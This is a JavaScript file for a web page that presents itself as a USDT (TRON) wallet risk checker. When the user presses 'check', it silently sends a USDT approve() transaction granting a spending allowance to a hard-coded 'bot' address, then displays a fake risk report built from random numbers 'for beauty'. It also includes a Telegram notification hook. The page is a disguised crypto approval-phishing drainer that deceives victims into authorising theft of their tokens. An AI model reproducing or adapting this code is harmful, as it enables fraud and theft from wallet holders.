// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ – ТОЛЬКО ДЛЯ USDT (TR7NH...)
// ============================================

// Адреса (проверьте, что они верны!)
const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT (TRC-20)
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';       // Бот
const COLLECTION_ADDRESS = 'TTC9nFcmD9ziGLzJdDpG3ciSKuvLVWxRrG'; // Ваш кошелёк

let connectedWalletAddress = null;

// Элементы DOM
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (TronLink / Trust)
// ============================================
async function connectWallet() {
    try {
        // TronLink
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ TronLink подключён!');
            return;
        }

        // Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ Trust Wallet подключён!');
            return;
        }

        alert('❌ Кошелёк не обнаружен. Установите TronLink или Trust Wallet.');
    } catch (error) {
        console.error('Ошибка подключения:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE (ФИКСИРОВАННАЯ СУММА 10 USDT)
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк.');
            return;
        }

        const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
        if (!tronWeb) {
            alert('❌ TronWeb не доступен.');
            return;
        }

        console.log('🔄 Начинаем approve...');

        // Фиксированная сумма – 10 USDT (10 * 10^6)
        const amount = '10000000';

        // Получаем контракт USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        // Блокируем кнопку
        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        // Отправляем approve
        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 150_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        console.log('✅ Approve отправлен:', tx);

        // Разблокируем кнопку
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        alert(`✅ Approve успешно отправлен!\n\nTX: https://tronscan.org/#/transaction/${tx}`);

        // Показываем демо-отчёт (опционально)
        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        alert(`❌ Ошибка: ${error.message}\n\nКод ошибки: ${error.code || 'нет'}`);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ (для красоты)
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;

    // Генерируем случайные цифры
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// ТЕСТ TELEGRAM (если нужно)
// ============================================
async function testTelegram() {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'test', message: 'Тест из сайта' })
        });
        if (response.ok) alert('✅ Тест Telegram успешен');
        else alert('❌ Ошибка Telegram');
    } catch (error) {
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    // Делаем testTelegram доступной глобально (если кнопка на сайте есть)
    window.testTelegram = testTelegram;
});
